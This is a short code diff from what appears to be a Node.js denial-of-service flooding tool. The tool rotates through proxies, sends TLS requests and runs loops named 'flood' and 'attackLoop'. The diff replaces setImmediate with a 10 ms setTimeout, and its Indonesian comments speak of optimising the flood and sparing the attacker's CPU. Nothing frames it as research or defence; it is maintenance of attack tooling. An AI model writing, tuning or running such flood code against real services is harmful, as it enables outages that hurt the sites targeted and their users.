@@ -71,7 +71,7 @@ if (cluster.isMaster) {
                     client.write(request);
                 }
 
-                setImmediate(flood); // Menghapus delay agar request dikirim secepat mungkin
+                setTimeout(flood, 10); // Delay kecil untuk mengurangi beban CPU
             }
             flood();
         });
@@ -95,7 +95,7 @@ if (cluster.isMaster) {
         proxyIndex = (proxyIndex + 1) % proxies.length; 
 
         sendTLSRequest(proxy);
-        setImmediate(attackLoop); // Menghapus delay untuk mengoptimalkan flooding
+        setTimeout(attackLoop, 10); // Delay kecil agar CPU tidak overload
     }
 
     process.on('uncaughtException', (err) => {
